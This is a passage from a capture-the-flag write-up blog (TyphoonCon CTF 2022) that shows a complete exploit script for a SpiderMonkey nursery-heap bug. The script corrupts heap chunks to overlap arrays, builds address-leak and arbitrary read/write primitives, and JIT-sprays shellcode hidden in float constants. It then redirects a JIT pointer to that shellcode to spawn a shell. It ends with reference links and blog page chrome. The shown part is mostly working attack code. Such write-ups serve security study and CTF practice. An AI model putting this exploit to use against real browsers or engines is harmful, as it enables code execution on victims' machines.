</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 94
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 95
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 96
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 97
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 98
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 99
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">100
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">101
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">102
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">103
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">104
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">105
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">106
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">107
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">108
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">109
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">110
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">111
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">112
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">113
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">114
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">115
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">116
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">117
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">118
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">119
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">120
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">121
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">122
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">123
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">124
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">125
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">126
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">127
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">128
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">129
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">130
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">131
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">132
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">133
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">134
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">135
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">136
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">137
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">138
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#09f;font-style:italic">/* Sequence of operations to corrupt the Nursery Heap */</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// NOTES:
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// - The size that I choose is based on trial-and-error inspecting the GDB
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// - Funny, but adding multiple line of comments also affect the nursery heap chunk layout. So I use inline comment to make sure my payload is working lol.
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>a <span style="color:#555">=</span> <span style="color:#069;font-weight:bold">new</span> <span style="color:#366">Array</span>(<span style="color:#f60">0x7e</span>) <span style="color:#09f;font-style:italic">// This will initialize a-chunk inside the Nursery Heap. position_ (Nursery heap pointer to the first unallocated chunk) is still correct
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>b <span style="color:#555">=</span> <span style="color:#069;font-weight:bold">new</span> <span style="color:#366">Array</span>(<span style="color:#f60">0x50</span>) <span style="color:#09f;font-style:italic">// This will add a new chunk (b-chunk) after the a-chunk position_ is still correct
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>a.length <span style="color:#555">=</span> <span style="color:#f60">0</span> <span style="color:#09f;font-style:italic">// This will trigger reallocateBuffer (which is the bug). After this, the position_ is corrupted, where it is now pointing to around the middle of a-chunk
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>b.fill(<span style="color:#f60">0</span>) <span style="color:#09f;font-style:italic">// Fill b to increase the array b total element count, so that later we can write a value to any of b array elements.
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>c <span style="color:#555">=</span> <span style="color:#069;font-weight:bold">new</span> <span style="color:#366">Array</span>(<span style="color:#f60">0x50</span>) <span style="color:#09f;font-style:italic">// This will add a new chunk (c-chunk), which overlap a-chunk &amp; b-chunk. position_ will point to around b-chunk
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>c.length <span style="color:#555">=</span> <span style="color:#f60">0x10</span> <span style="color:#09f;font-style:italic">// This will trigger reallocateBuffer (which is the bug). After this, the position_ is corrupted, where it is now pointing to around the middle of b-chunk, specifically in the area of b-chunk array elements.
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>d <span style="color:#555">=</span> <span style="color:#069;font-weight:bold">new</span> <span style="color:#366">Array</span>(<span style="color:#f60">0x20</span>) <span style="color:#09f;font-style:italic">// This will add a new chunk (d-chunk), which overlap b-chunk. Now, this d array metadata is actually overlapping with the b array elements. Hence, with b, we can overwrite the metadata stored for array d.
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>d.fill(<span style="color:#f60">0</span>) <span style="color:#09f;font-style:italic">// Fill d to increase the array d total element count.
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// Assign 3 properties to d. This will be used during crafting addrof method
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>d.x <span style="color:#555">=</span> <span style="color:#f60">2.4303</span>e<span style="color:#555">-</span><span style="color:#f60">320</span>;
</span></span><span style="display:flex;"><span>d.y <span style="color:#555">=</span> <span style="color:#f60">2.4303</span>e<span style="color:#555">-</span><span style="color:#f60">320</span>;
</span></span><span style="display:flex;"><span>d.z <span style="color:#555">=</span> <span style="color:#f60">2.4303</span>e<span style="color:#555">-</span><span style="color:#f60">320</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">/* Initializing helper method for casting purposes */</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// Converter taken from https://org.anize.rs/corCTF-2021/pwn/outfoxed
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// This will help us to convert between BigInt and Double easily
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span><span style="color:#069;font-weight:bold">let</span> converter <span style="color:#555">=</span> <span style="color:#069;font-weight:bold">new</span> ArrayBuffer(<span style="color:#f60">8</span>);
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">let</span> u64view <span style="color:#555">=</span> <span style="color:#069;font-weight:bold">new</span> BigUint64Array(converter);
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">let</span> f64view <span style="color:#555">=</span> <span style="color:#069;font-weight:bold">new</span> Float64Array(converter);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// Bit-cast an uint64_t to a float64
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span><span style="color:#069;font-weight:bold">function</span> i2d(x) {
</span></span><span style="display:flex;"><span>    u64view[<span style="color:#f60">0</span>] <span style="color:#555">=</span> x;
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> f64view[<span style="color:#f60">0</span>];
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// Bit-cast a float64 to an uint64_t
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span><span style="color:#069;font-weight:bold">function</span> d2i(x) {
</span></span><span style="display:flex;"><span>    f64view[<span style="color:#f60">0</span>] <span style="color:#555">=</span> x;
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> u64view[<span style="color:#f60">0</span>];
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// Add double with BigInt. Return Double
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span><span style="color:#069;font-weight:bold">function</span> doubleAddBigInt(x, y) {
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> i2d(d2i(x) <span style="color:#555">+</span> y)
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">/* Building function to perform read &amp; write */</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// Some ideas are taken from https://webcache.googleusercontent.com/search?q=cache:ySfo3rNPA2kJ:https://labs.f-secure.com/blog/exploiting-cve-2019-17026-a-firefox-jit-bug/
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>
</span></span><span style="display:flex;"><span>d.x <span style="color:#555">=</span> <span style="color:#f60">0.0</span>;
</span></span><span style="display:flex;"><span>d.y <span style="color:#555">=</span> <span style="color:#f60">0.0</span>;
</span></span><span style="display:flex;"><span>d.z <span style="color:#555">=</span> <span style="color:#f60">0.0</span>;
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// Return given object address
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span><span style="color:#069;font-weight:bold">function</span> addrof(o) {
</span></span><span style="display:flex;"><span>    <span style="color:#09f;font-style:italic">// The purpose of this logic is given an object, we want to get the address of it. Logic:
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>    <span style="color:#09f;font-style:italic">// - First, we will store the original pointer of the object d properties
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>    <span style="color:#09f;font-style:italic">// - Then, we will set the given object to d.y
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>    <span style="color:#09f;font-style:italic">// - Instead of reading the stored value inside d.y, what we want to read is only the 6-LSB (bytes, not bits)
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>    <span style="color:#09f;font-style:italic">//   So, the trick is we will try to read d.x+6 (shift the current object d properties pointer by 6)
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>    <span style="color:#09f;font-style:italic">// - Now, the new d.x 8-bytes will consist of |d.y+5|d.y+4|d.y+3|d.y+2|d.y+1|d.y|d.x+8|d.x+7|
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>    <span style="color:#09f;font-style:italic">// - After that, convert it to BigInt, and then shift it by 2-bytes, so that we get the true address without tag.
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>    <span style="color:#09f;font-style:italic">// - Revert the pointer and return the Double representation of the object address.
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>    original <span style="color:#555">=</span> b[<span style="color:#f60">27</span>]
</span></span><span style="display:flex;"><span>    d.y <span style="color:#555">=</span> o
</span></span><span style="display:flex;"><span>    b[<span style="color:#f60">27</span>] <span style="color:#555">=</span> doubleAddBigInt(b[<span style="color:#f60">27</span>], <span style="color:#f60">0x6</span>n)
</span></span><span style="display:flex;"><span>    result <span style="color:#555">=</span> i2d(d2i(d.x) <span style="color:#555">&gt;&gt;</span> <span style="color:#f60">16</span>n)
</span></span><span style="display:flex;"><span>    b[<span style="color:#f60">27</span>] <span style="color:#555">=</span> original
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> result
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// Write value (double) to the given address (double)
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span><span style="color:#069;font-weight:bold">function</span> write(dbl_addr, dbl_val) {
</span></span><span style="display:flex;"><span>    <span style="color:#09f;font-style:italic">// General logic:
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>    <span style="color:#09f;font-style:italic">// - Overwrite the object d properties pointter to the given address.
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>    <span style="color:#09f;font-style:italic">// - Now, d.x will point to the given address.
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>    <span style="color:#09f;font-style:italic">// - Assign d.x value, which mean now the given address contains our given value.
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>    original <span style="color:#555">=</span> b[<span style="color:#f60">27</span>];
</span></span><span style="display:flex;"><span>    b[<span style="color:#f60">27</span>] <span style="color:#555">=</span> dbl_addr;
</span></span><span style="display:flex;"><span>    d.x <span style="color:#555">=</span> dbl_val;
</span></span><span style="display:flex;"><span>    b[<span style="color:#f60">27</span>] <span style="color:#555">=</span> original;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>target_buf <span style="color:#555">=</span> <span style="color:#069;font-weight:bold">new</span> Float64Array(<span style="color:#f60">1</span>);
</span></span><span style="display:flex;"><span>target_buf.fill(<span style="color:#f60">2.4303</span>e<span style="color:#555">-</span><span style="color:#f60">320</span>) <span style="color:#09f;font-style:italic">// Just to set the array element count
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>data_ptr <span style="color:#555">=</span> doubleAddBigInt(addrof(target_buf), <span style="color:#f60">0x30</span>n)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// Given an address in Double form, read &amp; return the address stored value as double
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span><span style="color:#069;font-weight:bold">function</span> read(dbl_addr) {
</span></span><span style="display:flex;"><span>    write(data_ptr, dbl_addr)
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> target_buf[<span style="color:#f60">0</span>]
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">/* JIT Spray */</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// Some ideas are taken from https://ret2.life/posts/corCTF-2021/#fn:2
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// Shellcode are inspired from https://ctftime.org/writeup/29915
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// This will be JITed later. These const will be stored in a r-x region after being JITed.
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span><span style="color:#069;font-weight:bold">function</span> sc() {
</span></span><span style="display:flex;"><span>    sc_marker <span style="color:#555">=</span> <span style="color:#f60">5.40900888</span>e<span style="color:#555">-</span><span style="color:#f60">315</span>;      <span style="color:#09f;font-style:italic">// 0x41414141 in memory. Will be used during searching for the address of our const.
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>    SC1 <span style="color:#555">=</span> <span style="color:#555">-</span><span style="color:#f60">6.827620262216015</span>e<span style="color:#555">-</span><span style="color:#f60">229</span>
</span></span><span style="display:flex;"><span>    SC2 <span style="color:#555">=</span> <span style="color:#555">-</span><span style="color:#f60">6.82852429045179</span>e<span style="color:#555">-</span><span style="color:#f60">229</span>
</span></span><span style="display:flex;"><span>    SC3 <span style="color:#555">=</span> <span style="color:#555">-</span><span style="color:#f60">6.82831220543336</span>e<span style="color:#555">-</span><span style="color:#f60">229</span>
</span></span><span style="display:flex;"><span>    SC4 <span style="color:#555">=</span> <span style="color:#555">-</span><span style="color:#f60">6.828527040799766</span>e<span style="color:#555">-</span><span style="color:#f60">229</span>
</span></span><span style="display:flex;"><span>    SC5 <span style="color:#555">=</span> <span style="color:#555">-</span><span style="color:#f60">6.828527034422697</span>e<span style="color:#555">-</span><span style="color:#f60">229</span>
</span></span><span style="display:flex;"><span>    SC6 <span style="color:#555">=</span> <span style="color:#555">-</span><span style="color:#f60">6.828527034440643</span>e<span style="color:#555">-</span><span style="color:#f60">229</span>
</span></span><span style="display:flex;"><span>    SC7 <span style="color:#555">=</span> <span style="color:#555">-</span><span style="color:#f60">6.828527034390964</span>e<span style="color:#555">-</span><span style="color:#f60">229</span>
</span></span><span style="display:flex;"><span>    SC8 <span style="color:#555">=</span> <span style="color:#555">-</span><span style="color:#f60">6.828527042770368</span>e<span style="color:#555">-</span><span style="color:#f60">229</span>
</span></span><span style="display:flex;"><span>    SC9 <span style="color:#555">=</span> <span style="color:#555">-</span><span style="color:#f60">6.828527034447392</span>e<span style="color:#555">-</span><span style="color:#f60">229</span>
</span></span><span style="display:flex;"><span>    SC10 <span style="color:#555">=</span> <span style="color:#555">-</span><span style="color:#f60">6.828527034370483</span>e<span style="color:#555">-</span><span style="color:#f60">229</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// Execute sc 0x1000 to make it got JITed
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span><span style="color:#069;font-weight:bold">for</span> (i <span style="color:#555">=</span> <span style="color:#f60">0</span>; i <span style="color:#555">&lt;</span> <span style="color:#f60">0x1000</span>; i<span style="color:#555">++</span>) sc();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// Get the function address
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>sc_addr <span style="color:#555">=</span> addrof(sc)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// Inspecting via gdb, we found that sc_addr + 0x28 contains pointer to JIT area
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>jit_info <span style="color:#555">=</span> doubleAddBigInt(sc_addr, <span style="color:#f60">0x28</span>n)
</span></span><span style="display:flex;"><span>jit_addr <span style="color:#555">=</span> read(jit_info)
</span></span><span style="display:flex;"><span>code_addr <span style="color:#555">=</span> read(jit_addr) <span style="color:#09f;font-style:italic">// Now we have the address of the JIT area
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// Brute force per byte until we found our magic string (0x41414141)
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span><span style="color:#069;font-weight:bold">for</span> (<span style="color:#069;font-weight:bold">var</span> i <span style="color:#555">=</span> <span style="color:#f60">200</span>n; i <span style="color:#555">&lt;=</span> <span style="color:#f60">132777</span>n; i<span style="color:#555">++</span>) {
</span></span><span style="display:flex;"><span>    print(i)
</span></span><span style="display:flex;"><span>    sc_start <span style="color:#555">=</span> doubleAddBigInt(code_addr, i)
</span></span><span style="display:flex;"><span>    check <span style="color:#555">=</span> read(sc_start)
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> (check <span style="color:#555">==</span> <span style="color:#f60">5.40900888</span>e<span style="color:#555">-</span><span style="color:#f60">315</span>) {
</span></span><span style="display:flex;"><span>        print(sc_start)
</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">break</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// Our real payload start 8 bytes after it
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>sc_start <span style="color:#555">=</span> doubleAddBigInt(sc_start, <span style="color:#f60">0x8</span>n)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// Overwrite the jit address pointer of our sc func to point to our hidden shellcode
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>write(jit_addr, sc_start)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// Call our shell
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>sc()
</span></span></code></pre></td></tr></table>
</div>
</div><h1 id="social-media">Social Media <a href="#social-media" class="anchor">#</a></h1>
<p>Follow me on <a href="https://twitter.com/chovid99" target="_blank" rel="noopener">twitter</a></p>
<h1 id="references">References <a href="#references" class="anchor">#</a></h1>
<ul>
<li><a href="https://github.com/m1ghtym0/browser-pwn" target="_blank" rel="noopener">https://github.com/m1ghtym0/browser-pwn</a></li>
<li><a href="https://doar-e.github.io/blog/2018/11/19/introduction-to-spidermonkey-exploitation" target="_blank" rel="noopener">https://doar-e.github.io/blog/2018/11/19/introduction-to-spidermonkey-exploitation</a></li>
<li><a href="https://doar-e.github.io/blog/2019/06/17/a-journey-into-ionmonkey-root-causing-cve-2019-9810/#the-nursery" target="_blank" rel="noopener">https://doar-e.github.io/blog/2019/06/17/a-journey-into-ionmonkey-root-causing-cve-2019-9810/#the-nursery</a></li>
<li><a href="https://org.anize.rs/corCTF-2021/pwn/outfoxed" target="_blank" rel="noopener">https://org.anize.rs/corCTF-2021/pwn/outfoxed</a></li>
<li><a href="https://webcache.googleusercontent.com/search?q=cache:ySfo3rNPA2kJ:https://labs.f-secure.com/blog/exploiting-cve-2019-17026-a-firefox-jit-bug/" target="_blank" rel="noopener">https://webcache.googleusercontent.com/search?q=cache:ySfo3rNPA2kJ:https://labs.f-secure.com/blog/exploiting-cve-2019-17026-a-firefox-jit-bug/</a></li>
<li><a href="https://ctftime.org/writeup/29915" target="_blank" rel="noopener">https://ctftime.org/writeup/29915</a></li>
<li><a href="https://ret2.life/posts/corCTF-2021/#fn:2" target="_blank" rel="noopener">https://ret2.life/posts/corCTF-2021/#fn:2</a></li>
<li><a href="https://bruce30262.github.io/Learning-browser-exploitation-via-33C3-CTF-feuerfuchs-challenge/" target="_blank" rel="noopener">https://bruce30262.github.io/Learning-browser-exploitation-via-33C3-CTF-feuerfuchs-challenge/</a></li>
<li><a href="https://vigneshsrao.github.io/posts/play-with-spidermonkey/" target="_blank" rel="noopener">https://vigneshsrao.github.io/posts/play-with-spidermonkey/</a></li>
</ul>

      </div>
      
        
  <aside class="toc-container">
    <a href="#" style="font-weight: 700; color: black;">TyphoonCon CTF 2022</a>
    <div class="js-toc">
      <details>
          <summary>Table of Contents
          </summary>
          <div>
              <nav id="TableOfContents">
  <ul>
    <li><a href="#see-you-allocator">See you Allocator</a>
      <ul>
        <li><a href="#initial-analysis">Initial Analysis</a></li>
        <li><a href="#exploitation-plan">Exploitation Plan</a></li>
        <li><a href="#solution">Solution</a></li>
      </ul>
    </li>
  </ul>
</nav>
          </div>
      </details>
    </div>
  </aside>


      
    </div>

    
        <div class="tags">
            
                <a href="https://chovid99.github.io/tags/writeup">Writeup</a>
            
                <a href="https://chovid99.github.io/tags/typhooncon">TyphoonCon</a>
            
                <a href="https://chovid99.github.io/tags/pwn">pwn</a>
            
                <a href="https://chovid99.github.io/tags/heap">heap</a>
            
                <a href="https://chovid99.github.io/tags/firefox">firefox</a>
            
                <a href="https://chovid99.github.io/tags/spidermonkey">SpiderMonkey</a>
            
                <a href="https://chovid99.github.io/tags/jit">JIT</a>
            
                <a href="https://chovid99.github.io/tags/browser">browser</a>
            
                <a href="https://chovid99.github.io/tags/oob">oob</a>
            
                <a href="https://chovid99.github.io/tags/2022">2022</a>
            
        </div>
    
    
    
  <div id="comment">
    
    
  </div>


</section>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<script src="/js/tocbot.min.js"></script>

<script type="text/javascript">
  tocbot.init({
      
      tocSelector: '.js-toc',
      
      contentSelector: '.js-toc-content',
      headingSelector: 'h1, h2, h3',
      orderedList: false,
      headingLabelCallback: s => s.substr(0, s.length-2),
      collapseDepth: 2
  });
  function initTOC() {
    var windowWidth = 1316;
    var $block_2 = $(".toc-container");
    var lastLeft = parseFloat($block_2.css("left").slice(0, -2))*(100/($(window).width()));
    $block_2.css("left", (lastLeft/lastWindowWidth)*$(window).width() + "vw");
  }
  window.onload = initTOC;

  var lastWindowWidth = $(window).width();
  $(window).resize(function() {
    var $block_2 = $(".toc-container");
    var lastLeft = parseFloat($block_2.css("left").slice(0, -2))*(100/($(window).width()));
    $block_2.css("left", (lastLeft/lastWindowWidth)*$(window).width() + "vw");
    lastWindowWidth = $(window).width();
  });
</script>

    </main>
    
    <footer id="footer">
    
        <div id="social">


    <a class="symbol" href="https://github.com/Chovid99" rel="me" target="_blank">
        
        <svg fill="#bbbbbb" width="28" height="28"  viewBox="0 0 72 72" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    
    <title>Github</title>
    <desc>Created with Sketch.</desc>
    <defs></defs>
    <g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
        <g id="Social-Icons---Rounded-Black" transform="translate(-264.000000, -939.000000)">
            <g id="Github" transform="translate(264.000000, 939.000000)">
                <path d="M8,72 L64,72 C68.418278,72 72,68.418278 72,64 L72,8 C72,3.581722 68.418278,-8.11624501e-16 64,0 L8,0 C3.581722,8.11624501e-16 -5.41083001e-16,3.581722 0,8 L0,64 C5.41083001e-16,68.418278 3.581722,72 8,72 Z" id="Rounded" fill="#bbbbbb"></path>
                <path d="M35.9985,13 C22.746,13 12,23.7870921 12,37.096644 C12,47.7406712 18.876,56.7718301 28.4145,59.9584121 C29.6145,60.1797862 30.0525,59.4358488 30.0525,58.7973276 C30.0525,58.2250681 30.0315,56.7100863 30.0195,54.6996482 C23.343,56.1558981 21.9345,51.4693938 21.9345,51.4693938 C20.844,48.6864054 19.2705,47.9454799 19.2705,47.9454799 C17.091,46.4500754 19.4355,46.4801943 19.4355,46.4801943 C21.843,46.6503662 23.1105,48.9634994 23.1105,48.9634994 C25.2525,52.6455377 28.728,51.5823398 30.096,50.9649018 C30.3135,49.4077535 30.9345,48.3460615 31.62,47.7436831 C26.2905,47.1352808 20.688,45.0691228 20.688,35.8361671 C20.688,33.2052792 21.6225,31.0547881 23.1585,29.3696344 C22.911,28.7597262 22.0875,26.3110578 23.3925,22.9934585 C23.3925,22.9934585 25.4085,22.3459017 29.9925,25.4632101 C31.908,24.9285993 33.96,24.6620468 36.0015,24.6515052 C38.04,24.6620468 40.0935,24.9285993 42.0105,25.4632101 C46.5915,22.3459017 48.603,22.9934585 48.603,22.9934585 C49.9125,26.3110578 49.089,28.7597262 48.8415,29.3696344 C50.3805,31.0547881 51.309,33.2052792 51.309,35.8361671 C51.309,45.0917119 45.6975,47.1292571 40.3515,47.7256117 C41.2125,48.4695491 41.9805,49.9393525 41.9805,52.1877301 C41.9805,55.4089489 41.9505,58.0067059 41.9505,58.7973276 C41.9505,59.4418726 42.3825,60.1918338 43.6005,59.9554002 